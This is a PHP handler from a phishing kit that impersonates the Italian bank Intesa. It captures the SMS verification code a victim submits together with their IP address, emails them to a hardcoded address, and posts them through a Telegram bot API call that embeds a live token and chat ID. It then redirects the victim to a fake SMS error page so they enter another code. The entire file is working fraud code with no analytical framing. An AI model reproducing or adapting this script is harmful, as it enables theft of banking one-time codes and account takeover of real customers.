<?php
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
if(!empty($_POST['user'])){
$message  = "=========[BILLING INFO]=========\n";
$message .= "SMS  : ".$_POST['user']."\n";
$message .= "===============[IP]==============\n";
$message .= "IP : http://www.geoiptool.com/?IP=$ip\n";
$message .= "==========[BILLING INFO]=========";
$to="gcc@gamers.com";
$subject = "PHONE INTESA [$ip]";
$headers = "From: INTESA <>";
$headers .= "MIME-Version: 1.0\n";
mail($to, $subject, $message,$headers);
		    $token = "6615372830:AAF4WMjDFb6tnsNuJgUoYHJF3OM2Utrz45M";
    file_get_contents("https://api.telegram.org/bot$token/sendMessage?chat_id=-4024396725&text=" . urlencode($message)."" );
header("Location:../smserr.php");
}else{
header("Location:../sms.php");
}

?>